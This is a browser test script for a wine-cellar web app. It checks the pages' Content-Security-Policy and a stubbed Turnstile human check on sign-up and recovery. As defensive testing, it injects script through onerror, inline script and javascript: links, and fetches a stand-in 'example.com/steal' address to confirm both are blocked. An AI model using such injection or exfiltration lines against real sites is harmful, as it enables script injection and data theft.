// Browser test of the pages' Content-Security-Policy and the "are you human" check: the policy is there on every
// page and stops injected script, while everything the site really does still works under it (an encrypted sign-up
// running Code.gs in the browser, the sommelier, the atlas with its relief tiles and slope profile, the domaine page),
// with no violation reported. Sign-up and recovery show Turnstile when config.js has a site key, send its token, and
// reset it after.
//   (cd .. && python3 -m http.server 8765) & node tools/csp-ui-test.js
"use strict";
const fs = require("fs"), path = require("path");
const { chromium } = require("./pw");
const H = require("./gas-harness");
const BASE = process.env.BASE || "http://localhost:8765/";
const gas = H({ Ark1: [["Producent", "Land", "Område", "Kommune", "Mark/Navn", "Klassifikation", "Type", "Drue", "Årgang", "Antal", "Pris kr (WS)", "Drukket", "Kilde", "Note"]] },
              { settings: { SIGNUP_CODE: "invite" } });
const results = []; const check = (name, ok, extra = "") => { results.push(ok); console.log((ok ? "PASS " : "FAIL ") + name + (ok ? "" : "  " + extra)); };
const BLANK = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64");
// a stand-in for Cloudflare's widget, served from its address so the policy is tested as it will be
const FAKE_TURNSTILE = `window.turnstile = {
  render(sel, o) { const el = document.querySelector(sel); el.textContent = "[human check]"; window.__ts = { key: o.sitekey, resets: 0 }; return "w1"; },
  getResponse() { return "XXXX.DUMMY.TOKEN.XXXX"; }, reset() { window.__ts.resets++; } };`;

(async () => {
  const b = await chromium.launch(); const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
  const sent = [];
  await ctx.route("https://script.google.com/**", async route => { const q = JSON.parse(route.request().postData() || "{}"); sent.push(q);
    await route.fulfill({ contentType: "application/json", body: JSON.stringify(gas.call(q)) }); });
  await ctx.route(/data\.geopf\.fr\/wmts/, route => route.fulfill({ contentType: "image/png", body: BLANK }));
  await ctx.route(/data\.geopf\.fr\/altimetrie/, route => route.fulfill({ contentType: "application/json",
    body: JSON.stringify({ elevations: Array.from({ length: 30 }, (_, i) => ({ z: 300 - i })) }) }));
  await ctx.route(/challenges\.cloudflare\.com\/turnstile/, route => route.fulfill({ contentType: "text/javascript", body: FAKE_TURNSTILE }));
  const config = fs.readFileSync(path.join(__dirname, "..", "config.js"), "utf8").replace(/TURNSTILE_SITE_KEY: ""/, 'TURNSTILE_SITE_KEY: "1x00000000000000000000AA"');
  await ctx.route(/\/config\.js/, route => route.fulfill({ contentType: "text/javascript", body: config }));
  // every violation the browser reports, from the start of each page
  await ctx.addInitScript(() => { window.__csp = []; document.addEventListener("securitypolicyviolation", e => window.__csp.push(e.violatedDirective + " " + e.blockedURI)); });
  const errs = [];
  const open = async url => { const p = await ctx.newPage(); p.on("pageerror", e => errs.push(url + ": " + e.message));
    p.on("console", m => m.type() === "error" && errs.push(url + ": " + m.text())); await p.goto(BASE + url); await p.waitForTimeout(500); return p; };
  const violations = p => p.evaluate(() => window.__csp);

  // ── the cellar page ──
  const p = await open("");
  for (const f of ["", "burgundy.html", "domaine.html"]) {
    const html = fs.readFileSync(path.join(__dirname, "..", f || "index.html"), "utf8");
    check(`${f || "index.html"} carries a policy that allows no inline script`, /http-equiv="Content-Security-Policy"/.test(html) && !/script-src[^;"]*'unsafe-inline'/.test(html) && /object-src 'none'/.test(html));
  }
  await p.evaluate(() => {
    document.body.insertAdjacentHTML("beforeend", '<img src="data:," onerror="window.__pwn1 = 1">');
    const s = document.createElement("script"); s.textContent = "window.__pwn2 = 1"; document.body.appendChild(s);
    const a = document.createElement("a"); a.href = "javascript:window.__pwn3 = 1"; document.body.appendChild(a); a.click();
  });
  await p.waitForTimeout(300);
  check("injected HTML can't run script: onerror, inline <script>, javascript: links", await p.evaluate(() => !window.__pwn1 && !window.__pwn2 && !window.__pwn3));
  const blocked = await violations(p);
  check("…the browser reports each one as blocked", blocked.filter(v => /script-src/.test(v)).length >= 2, JSON.stringify(blocked));
  await p.evaluate(() => { window.__csp = []; });
  errs.length = 0;

  // sign-up with the human check
  check("no human check on the login form", !(await p.isVisible("#gateHuman")));
  await p.click("#gateToggle"); await p.waitForTimeout(400);
  check("sign-up shows the human check, with the site key", await p.isVisible("#gateHuman") && (await p.evaluate(() => window.__ts && window.__ts.key)) === "1x00000000000000000000AA");
  await p.fill("#gateUser", "anna"); await p.fill("#gatePass", "anna-pass-1"); await p.fill("#gateInvite", "invite"); await p.click("#gateSubmit");
  await p.waitForSelector("#recModal.open", { timeout: 20000 }); await p.check("#recOk"); await p.click("#recDone");
  await p.waitForSelector("#app:not([hidden])", { timeout: 20000 });
  const su = sent.find(x => x.action === "signup");
  check("…its token goes with the sign-up", su && su.turnstile === "XXXX.DUMMY.TOKEN.XXXX");
  check("…and the widget is reset after (a token works once)", (await p.evaluate(() => window.__ts.resets)) >= 1);
  check("an encrypted cellar runs under the policy (Code.gs in the browser)", await p.isVisible("#tbl") || await p.isVisible("#content"));
  await p.click("#addBtn"); await p.fill("#aProducer", "Domaine Roulot"); await p.fill("#aName", "Meursault Perrières"); await p.click('#addForm button[type="submit"]');
  await p.waitForFunction(() => document.querySelector("#tbl").textContent.includes("Roulot"), null, { timeout: 10000 }).catch(() => {});
  check("…a wine can be added", (await p.textContent("#tbl")).includes("Roulot"));
  await p.click("#sommBtn"); await p.waitForSelector("#sommLog .sm-a", { timeout: 10000 });
  await p.fill("#sommQ", "who owns musigny"); await p.press("#sommQ", "Enter"); await p.waitForTimeout(600);
  check("…the sommelier loads and answers", /Musigny/i.test(await p.textContent("#sommLog")));
  check("…with no violation on the cellar page", !(await violations(p)).length, JSON.stringify(await violations(p)));

  // ── the atlas: relief tiles, slope profile, the cellar overlay ──
  const a = await open("burgundy.html"); await a.waitForTimeout(1500);
  check("the atlas draws its map", (await a.$$("#map path")).length > 100);
  // the slope profile's request, as the page makes it (the tool itself needs the surveyed-map mode and two clicks)
  const alt = await a.evaluate(async () => { try { const j = await (await fetch("https://data.geopf.fr/altimetrie/1.0/calcul/alti/rest/elevationLine.json?lon=4.95|4.96&lat=47.2|47.21")).json(); return j.elevations.length; } catch (e) { return String(e); } });
  check("…IGN's altitude service, for the slope profile, is allowed", alt === 30, String(alt));
  const ext = await a.evaluate(async () => { try { await fetch("https://example.com/steal?x=1"); return "sent"; } catch (e) { return "blocked"; } });
  check("…and an address the page has no business with is not", ext === "blocked");
  check("…with no other violation on the atlas", !(await violations(a)).filter(v => !/example\.com/.test(v)).length, JSON.stringify(await violations(a)));
  const d = await open("domaine.html"); await d.waitForTimeout(1000);
  check("the domaine page works, with no violation", (await d.textContent("body")).length > 200 && !(await violations(d)).length, JSON.stringify(await violations(d)));

  // ── recovery shows the check too ──
  const r = await open(""); await r.evaluate(() => localStorage.clear());
  await r.reload(); await r.waitForTimeout(400); await r.click("#gateForgot"); await r.waitForTimeout(400);
  check("recovery shows the human check", await r.isVisible("#gateHuman"));
  const real = errs.filter(e => !/example\.com/.test(e)); // the blocked fetch above is this test's own
  check("no console errors", !real.length, real.join(" | "));
  await b.close();
  const n = results.filter(Boolean).length; console.log(`\n${n}/${results.length} passed`); process.exit(n === results.length ? 0 : 1);
})().catch(e => { console.error(e); process.exit(1); });
